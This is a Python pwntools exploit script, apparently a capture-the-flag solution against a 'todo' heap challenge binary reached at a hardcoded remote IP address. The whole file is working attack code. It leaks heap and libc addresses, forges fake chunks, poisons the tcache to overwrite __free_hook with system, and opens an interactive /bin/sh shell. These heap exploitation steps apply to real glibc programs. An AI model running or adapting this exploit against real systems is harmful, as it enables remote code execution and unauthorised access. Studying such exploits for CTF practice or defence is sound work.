from pwn import *
context.log_level = 'debug'

#HOST = '172.17.0.2'
#PORT = 1337
HOST = '35.245.168.146'
PORT = 1

is_remote = True
if is_remote:
    libc = ELF('../libc-2.31.so')
else:
    # Replace this with your local libc library 
    #    (with patched test sil, 0xf -> test sil, 0x7)
    libc = ELF('./libc.so.6')

def choice(num): p.sendlineafter('>>> ', str(num))

def add(catg, tasks):
    choice(1)
    p.sendlineafter('>>> ', str(catg))
    p.sendlineafter('add: ', str(len(tasks)))
    for t in tasks:
        p.sendline(t)

def finish(catg, inds):
    choice(3)
    p.sendlineafter('>>> ', str(catg))

    if b'pending' in p.recvuntil(('You have no pending tasks', '  1 - ')):
        return []

    # Read list of tasks
    num = 2
    tasks = []
    while True:
        task, _, end = p.recvuntil((f'\n  {num} - ', '\n>>> ')).rpartition(b'\n')
        tasks.append(task)
        if b'>>>' in end: break
        num += 1

    # Finish set of tasks
    for ind in inds:
        p.sendline(str(ind+1))
        if b'pending' in p.recvuntil(('no more pending tasks', '>>> ')):
            break
    else:
        p.sendline('-1')
    
    return tasks

def view(catg):
    return finish(catg, [])

if is_remote:
    p = remote(HOST, PORT)
else:
    p = process('../todo', env={'LD_LIBRARY_PATH': '.'})

# Make fake chunks if offset +8
add(0, [b'A'*0x11] * 0x21)
add(0, [b'A']) # cause a free of an array to leak pointer
add(1, ['A'*0x8] * 9)
leak = u64(view(1)[8][8:] + b'\x00\x00')
log.success('Heap leak: ' + hex(leak))

finish(0, [0] * 0x22)
finish(1, [0] * 0x9)

# tmps = [malloc(0x88)] * 7, prev = malloc(0x988)
add(0, [b'A'*0x80] * 7 + ['B' * 0x980, 'A'])

# Get rid of that annoying chunk created when we wrote such a long string
add(4, [b'annoy'] * 120 + [b'C' * 0xb0])

# arr = new String[0x90]
add(1, ['A'*0x11] * 0x90)

# free(prev)
finish(0, [7])

# tmp = malloc(0x38); p = new Char[0x20]
add(2, ['A' * 0x30, b'A' * 8 + p64(0x911) + p64(leak + 0x908) + \
        p64(leak + 0x910) + p64(0)])

# free tmps[*] (since there is one in tcache)
finish(0, [0] * 6)

# victim = malloc(0x38), tmp2 = malloc(0x868)
add(3, ['A' * 0x30, 'A' * 0x850, 'A'])

# some heap massaging
add(5, ['A'] * 0x16 + ['A' * 0x11] * 0x120)
finish(5, list(range(0x15, 512)))
finish(3, [1])


# Cause free(arr)
add(1, ['A'*0x10])

# free(tmp); free(hihi)
finish(2, [0])
finish(3, [0])

# Now leak libc
finish(3, [0])
add(3, ['A' * 0x1000]) # trigger malloc consolidation
finish(3, [0])
add(3, ['']*0x5)
libc_leak = u64(finish(3, [0]*5)[0] + b'\0\0')
libc_base = libc_leak - (libc.symbols['__malloc_hook'] + 0x80)

libc.address = libc_base
log.info('Libc base: 0x%x', libc_base)
log.info('__free_hook: 0x%x', libc.symbols['__free_hook'])


# Overwrite fd of tcache of chk size 0x40 that is embedded within our fake free chunk
exp = b'A' * (0x50) + p64(0) + p64(0x41) + p64(libc.symbols['__free_hook'] - \
        0x10) + p64(leak - 0x12548)
exp = exp.ljust(0x900, b'A')
add(3, [exp])

# Allocate two chunks of size 0x40 and we have arb write!
finish(3, [0])
pause()
add(3, ['A' * 0x30, b'/bin/sh\0' + p64(libc.symbols.system) + b'A' * 0x20])

p.interactive()
